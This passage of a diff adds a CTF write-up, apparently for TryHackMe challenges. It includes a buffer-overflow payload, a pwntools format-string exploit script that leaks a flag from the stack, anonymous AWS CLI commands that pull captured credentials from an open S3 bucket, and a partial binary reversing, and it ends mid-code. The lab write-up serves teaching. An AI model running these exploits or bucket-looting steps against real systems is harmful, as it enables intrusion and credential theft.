+<li><code>[padding]</code>: Variable-length padding to reach the <code>password</code> buffer.</li>
+<li><code>5up3rP4zz123Byte\x00</code>: Overwrites <code>password</code> to match the required string.<br>
+The null byte after <code>bytereaper</code> terminates the string for <code>strcmp()</code>, while padding ensures the password aligns correctly in memory. After fuzzing, a padding size succeeds, yielding the flag in the response starting with <code>THM{</code>.</li>
+</ul>
+<h3 id="flag-vault-2">Flag Vault 2</h3>
+<p><strong>Challenge Description:</strong><br>
+How did you do that? No worries. I&rsquo;ll adjust a couple of lines of code so you won&rsquo;t be able to get the flag anymore. This time, for real. Here&rsquo;s the source code once again.</p>
+<h4 id="solution-6">Solution</h4>
+<p><strong>Source Code Overview</strong><br>
+The updated C program modifies the vault of the previous challenge, removing authentication but altering how the flag is handled. Key functions include a flag printer (now disabled), and a login routine.
+Below is the source code:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">print_banner</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span> <span class="s">&#34;  ______ _          __      __         _ _   </span><span class="se">\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34; |  ____| |         </span><span class="se">\\</span><span class="s"> </span><span class="se">\\</span><span class="s">    / /        | | |  </span><span class="se">\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34; | |__  | | __ _  __ </span><span class="se">\\</span><span class="s"> </span><span class="se">\\</span><span class="s">  / /_ _ _   _| | |_ </span><span class="se">\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34; |  __| | |/ _` |/ _` </span><span class="se">\\</span><span class="s"> </span><span class="se">\\</span><span class="s">/ / _` | | | | | __|</span><span class="se">\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34; | |    | | (_| | (_| |</span><span class="se">\\</span><span class="s">  / (_| | |_| | | |_ </span><span class="se">\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34; | |_|    |_|</span><span class="se">\\</span><span class="s">__,_|</span><span class="se">\\</span><span class="s">__, | </span><span class="se">\\</span><span class="s">/ </span><span class="se">\\</span><span class="s">__,_|</span><span class="se">\\</span><span class="s">__,_|_|</span><span class="se">\\</span><span class="s">__|</span><span class="se">\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;                  __/ |                      </span><span class="se">\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;                 |___/                       </span><span class="se">\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;                                             </span><span class="se">\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;Version 2.1 - Fixed print_flag to not print the flag. Nothing you can do about it!</span><span class="se">\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;==================================================================</span><span class="se">\n\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">          <span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">print_flag</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">username</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="n">FILE</span> <span class="o">*</span><span class="n">f</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="s">&#34;flag.txt&#34;</span><span class="p">,</span><span class="s">&#34;r&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="mi">200</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">fgets</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="mi">199</span><span class="p">,</span> <span class="n">f</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//printf(&#34;%s&#34;, flag);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    
+</span></span><span class="line"><span class="cl">    <span class="c1">//The user needs to be mocked for thinking they could retrieve the flag
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Hello, &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="n">username</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;. Was version 2.0 too simple for you? Well I don&#39;t see no flags being shown now xD xD xD...</span><span class="se">\n\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Yours truly,</span><span class="se">\n</span><span class="s">ByteReaper</span><span class="se">\n\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">login</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">username</span><span class="p">[</span><span class="mi">100</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Username: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">gets</span><span class="p">(</span><span class="n">username</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// The flag isn&#39;t printed anymore. No need for authentication
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">print_flag</span><span class="p">(</span><span class="n">username</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">main</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">print_banner</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">login</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p><strong>Solution</strong><br>
+The new code introduces a format string vulnerability in the <code>print_flag()</code> function by directly passing the user-controlled username to <code>printf()</code>.
+In the <code>print_flag()</code> function, the username is passed directly to <code>printf()</code> without a format string:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">printf</span><span class="p">(</span><span class="n">username</span><span class="p">);</span>
+</span></span></code></pre></div><p>When <code>printf()</code> receives a string with format specifiers (e.g., <code>%p</code>, <code>%s</code>), it interprets them as instructions to read arguments from the stack. Without proper arguments provided, it reads arbitrary stack data, potentially leaking sensitive information like the <code>flag</code> buffer. The <code>flag</code> buffer is declared in <code>print_flag()</code> and read from <code>flag.txt</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">//stack layout [ flag (200 bytes) ][ username (100 bytes) ]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="mi">200</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nf">fgets</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="mi">199</span><span class="p">,</span> <span class="n">f</span><span class="p">);</span>
+</span></span></code></pre></div><p>Although the flag isn’t printed directly, it resides on the stack during the function’s execution. Format string attacks can read stack memory, including this buffer, if its location is reachable.
+The format string vulnerability allows us to read stack data by supplying a username with format specifiers like %p, stack values can be printed.<br>
+With the following solve.py we can read the stack from the remote server and parse the right section to make the flag readable.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;MCHINE_IP&#39;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Username: &#34;</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="n">leak_payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;%p.&#34;</span> <span class="o">*</span> <span class="mi">20</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">leak_payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">response</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Was version&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">errors</span><span class="o">=</span><span class="s2">&#34;ignore&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Raw Leak Output:</span><span class="se">\n</span><span class="si">{</span><span class="n">response</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">leaked_values</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34; &#34;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">)</span>  <span class="c1"># Extract hex addresses</span>
+</span></span><span class="line"><span class="cl"><span class="n">decoded_string</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">value</span> <span class="ow">in</span> <span class="n">leaked_values</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">value</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&#34;0x&#34;</span><span class="p">):</span>  <span class="c1"># Check if it&#39;s a valid hex address</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">hex_value</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">value</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># Convert to bytes (little-endian) and decode, keeping only printable chars</span>
+</span></span><span class="line"><span class="cl">            <span class="n">decoded_bytes</span> <span class="o">=</span> <span class="n">hex_value</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&#34;little&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">decoded_part</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">c</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">decoded_bytes</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">errors</span><span class="o">=</span><span class="s2">&#34;ignore&#34;</span><span class="p">)</span> <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="n">isprintable</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">            <span class="n">decoded_string</span> <span class="o">+=</span> <span class="n">decoded_part</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="n">decoded_string</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Extracted Flag: </span><span class="si">{</span><span class="n">flag</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span></code></pre></div><p>The script sends a payload of <code>%p</code>. repeated 20 times, where <code>%p</code> leaks stack values as pointers and <code>.</code> acts as a delimiter. The response contains these leaked values, which are parsed to find printable characters. Since the flag buffer resides on the stack, its contents are embedded in one of the leaked pointers. The script decodes each leaked hex value into bytes (little-endian), filters for printable characters, and concatenates them.</p>
+<h2 id="cloud">Cloud</h2>
+<h3 id="a-bucket-of-phish">A Bucket of Phish</h3>
+<p><strong>Challenge Description:</strong><br>
+DarkInjector has been using a Cmail phishing website to try to steal our credentials. We believe some of our users may have fallen for his trap. Can you retrieve the list of victim users?</p>
+<p>Here&rsquo;s the link to the website: <a href="http://darkinjector-phish.s3-website-us-west-2.amazonaws.com">http://darkinjector-phish.s3-website-us-west-2.amazonaws.com</a></p>
+<h4 id="solution-7">Solution</h4>
+<p>The URL indicates an AWS S3 bucket hosting the phishing site. The subdomain darkinjector-phish suggests the bucket name. Accessing the bucket directly via its S3 endpoint provides more insight: <code>https://darkinjector-phish.s3.amazonaws.com/</code><br>
+This returns an XML listing of the bucket’s contents:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;ListBucketResult</span> <span class="na">xmlns=</span><span class="s">&#34;http://s3.amazonaws.com/doc/2006-03-01/&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;Name&gt;</span>darkinjector-phish<span class="nt">&lt;/Name&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;Prefix</span> <span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;Marker</span> <span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;MaxKeys&gt;</span>1000<span class="nt">&lt;/MaxKeys&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;IsTruncated&gt;</span>false<span class="nt">&lt;/IsTruncated&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;Contents&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;Key&gt;</span>captured-logins-093582390<span class="nt">&lt;/Key&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;LastModified&gt;</span>2025-03-17T06:46:17.000Z<span class="nt">&lt;/LastModified&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;ETag&gt;</span>&#34;923e89c3ff247c768368b0d486484af4&#34;<span class="nt">&lt;/ETag&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;ChecksumAlgorithm&gt;</span>CRC64NVME<span class="nt">&lt;/ChecksumAlgorithm&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;ChecksumType&gt;</span>FULL_OBJECT<span class="nt">&lt;/ChecksumType&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;Size&gt;</span>132<span class="nt">&lt;/Size&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;Owner&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;ID&gt;</span>903215f2913d2f3026c35e300c621d0ccd51f13f578c37051b846ee8287567de<span class="nt">&lt;/ID&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;DisplayName&gt;</span>ariz<span class="nt">&lt;/DisplayName&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/Owner&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;StorageClass&gt;</span>STANDARD<span class="nt">&lt;/StorageClass&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/Contents&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;Contents&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;Key&gt;</span>index.html<span class="nt">&lt;/Key&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;LastModified&gt;</span>2025-03-17T06:25:33.000Z<span class="nt">&lt;/LastModified&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;ETag&gt;</span>&#34;3b392b5fc343b899cc3d67b6ecb2d025&#34;<span class="nt">&lt;/ETag&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;ChecksumAlgorithm&gt;</span>CRC64NVME<span class="nt">&lt;/ChecksumAlgorithm&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;ChecksumType&gt;</span>FULL_OBJECT<span class="nt">&lt;/ChecksumType&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;Size&gt;</span>2300<span class="nt">&lt;/Size&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;Owner&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;ID&gt;</span>903215f2913d2f3026c35e300c621d0ccd51f13f578c37051b846ee8287567de<span class="nt">&lt;/ID&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;DisplayName&gt;</span>ariz<span class="nt">&lt;/DisplayName&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/Owner&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;StorageClass&gt;</span>STANDARD<span class="nt">&lt;/StorageClass&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/Contents&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/ListBucketResult&gt;</span>
+</span></span></code></pre></div><p>The XML confirms the bucket name (darkinjector-phish) and lists two files: <code>index.html</code> (likely the phishing page) and <code>captured-logins-093582390</code> (suggesting stored credentials).
+To enumerate the bucket’s contents the AWS CLI can be used with anonymous access, as the bucket appears publicly readable:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">aws s3 ls s3://darkinjector-phish --no-sign-request --region us-west-2
+</span></span><span class="line"><span class="cl">2025-03-17 07:46:17        <span class="m">132</span> captured-logins-093582390
+</span></span><span class="line"><span class="cl">2025-03-17 07:25:33       <span class="m">2300</span> index.html
+</span></span></code></pre></div><p>The <code>captured-logins-093582390</code> file looks promising for containing victim credentials. With the aws cli we can just download/copy it to read it locally.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">aws s3 cp s3://darkinjector-phish/captured-logins-093582390 ./captured-logins-093582390 --no-sign-request --region us-west-2
+</span></span><span class="line"><span class="cl">download: s3://darkinjector-phish/captured-logins-093582390 to ./captured-logins-093582390
+</span></span></code></pre></div><p>Inspecting the downloaded file reveals the list of compromised users and a flag:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat captured-logins-093582390
+</span></span><span class="line"><span class="cl">user,pass
+</span></span><span class="line"><span class="cl">munra@thm.thm,Password123
+</span></span><span class="line"><span class="cl">test@thm.thm,123456
+</span></span><span class="line"><span class="cl">mario@thm.thm,Mario123
+</span></span><span class="line"><span class="cl">flag@thm.thm,THM<span class="o">{</span>this_is_not_what_i_meant_by_public<span class="o">}</span>
+</span></span></code></pre></div><h2 id="reverse-engineering">Reverse Engineering</h2>
+<h3 id="compute-magic">Compute Magic</h3>
+<p><strong>Challenge Description:</strong><br>
+We managed to gain access to one of the Phantom&rsquo;s servers and recover a binary that computes data. Discover how it works to get the flag on the remote server.</p>
+<h4 id="solution-8">Solution</h4>
+<p>We’re given a binary that runs a TCP server on port 9003. Our task is to reverse-engineer its behavior and craft an input that retrieves the flag from the remote server.</p>
+<p>The <code>main</code> function sets up a TCP socket server:</p>
+<ul>
+<li>Binds to port 9003 (0x232B in hex, via htons(0x232Bu)).</li>
+<li>Listens for connections and accepts them in a loop.</li>
+<li>For each connection:
+<ul>
+<li>Calls sendBanner (likely sends a prompt, e.g., &ldquo;Compute some magic!&rdquo;).</li>
+<li>Reads up to 16 bytes into a buffer (buf).</li>
+<li>Strips a trailing newline if present.</li>
+<li>Passes the buffer to checkSpell to process the input.</li>
+<li>Outputs &ldquo;Spell check successful&rdquo; or &ldquo;Spell check failed&rdquo; based on the result.</li>
+</ul>
+</li>
+</ul>
+<p>The <code>checkSpell</code> function <code>switches</code> based on the first character of the input:</p>
+<ul>
+<li>Letters &lsquo;A&rsquo; to &lsquo;Z&rsquo; call different functions (e.g., &lsquo;A&rsquo; → func_1, &lsquo;X&rsquo; → fun_readflag_7).</li>
+<li>Functions named fun_readflag_* have a subsequent call to the read_flag function.</li>
+<li>Functions that have not been renamed (<code>func_*</code>) always call the <code>magic_fail</code>, representing failed paths, and are irrelevant for retrieving the flag.</li>
+</ul>
+<p><img src="/computemagic.png" alt="computemagic"></p>
+<p>The relevant <code>fun_readflag_*</code> functions are as follows:</p>
+<ul>
+<li><code>fun_readflag_1</code> (&lsquo;H&rsquo;), <code>fun_readflag_3</code> (&lsquo;L&rsquo;), <code>fun_readflag_4</code> (&lsquo;P&rsquo; or &lsquo;Q&rsquo;) call <code>check_other</code> and only invoke <code>read_flag</code> if it returns 1.</li>
+</ul>
+<p>The <code>check_other</code> function performs some transformation on the input and checks the result.
+The input is transformed with <code>(xor_str[i] + 4) ^ 0xD</code> and the expected result is <code>AhhF1ag1571GHFDS</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">__int64</span> <span class="n">__fastcall</span> <span class="n">check_other</span><span class="p">(</span><span class="k">const</span> <span class="n">char</span> <span class="o">*</span><span class="n">xor_str</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="ne">int</span> <span class="n">i</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">18</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mi">28</span><span class="n">h</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">  <span class="n">char</span> <span class="n">var_other_input</span><span class="p">[</span><span class="mi">24</span><span class="p">];</span> <span class="o">//</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">20</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mi">20</span><span class="n">h</span><span class="p">]</span> <span class="n">BYREF</span>
+</span></span><span class="line"><span class="cl">  <span class="n">unsigned</span> <span class="n">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">38</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mi">8</span><span class="n">h</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">v4</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28</span><span class="n">u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">15</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">var_other_input</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">xor_str</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0xD</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">var_other_input</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">var_other_input</span><span class="p">,</span> <span class="s2">&#34;AhhF1ag1571GHFDS&#34;</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s2">&#34;Correct: </span><span class="si">%s</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">xor_str</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">1</span><span class="n">LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s2">&#34;Incorrect: </span><span class="si">%s</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">xor_str</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="n">LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>To reverse this transformation to get the expected input the following steps can be applied.</p>
+<ul>
+<li>For each char in &ldquo;AhhF1ag1571GHFDS&rdquo;, compute: input = (output ^ 0xD) - 4.</li>
+<li>Example: &lsquo;A&rsquo; (65) → (65 ^ 0xD) - 4 = 64 (&rsquo;@&rsquo;).</li>
+<li>Resulting string: &ldquo;@]]B5`c5935B@A?P&rdquo; (16 chars).</li>
+</ul>
+<p>I tried inputs like &ldquo;H@]]B5`c5935B@A?P&rdquo; (prefix &lsquo;H&rsquo; for fun_readflag_1). But no flag was printed as a result.
+Other <code>fun_readflag_*</code> functions that call read_flag directly include <code>fun_readflag_2</code>, <code>fun_readflag_5</code>, and <code>fun_readflag_6</code>:</p>
+<ul>
+<li><code>fun_readflag_2</code> is defined but not called by <code>checkSpell</code>, so it’s unreachable in the current control flow.</li>
+<li><code>fun_readflag_5</code> (also not called from any letter in <code>checkSpell</code>) and <code>fun_readflag_6</code> (&lsquo;S&rsquo;) call <code>read_flag</code> with a hardcoded socket descriptor (<code>1337</code>), which doesn’t match our connection’s descriptor:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">__int64 fun_readflag_5()
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">  read_flag(1337);
+</span></span><span class="line"><span class="cl">  return 0LL;
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></div><p>Finally, we have <code>fun_readflag_7</code> (&lsquo;X&rsquo;), which calls read_flag directly with the socket descriptor, no checks:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">__int64 __fastcall fun_readflag_7(__int64 a1, int a2)
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">  read_flag(a2);
+</span></span><span class="line"><span class="cl">  return 0LL;
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></div><p>The <code>read_flag</code> function opens &ldquo;flag.txt&rdquo; and sends its contents over the socket:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">unsigned __int64 __fastcall read_flag(int a1)
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">  FILE *stream;
+</span></span><span class="line"><span class="cl">  size_t n;
+</span></span><span class="line"><span class="cl">  char ptr[1032];
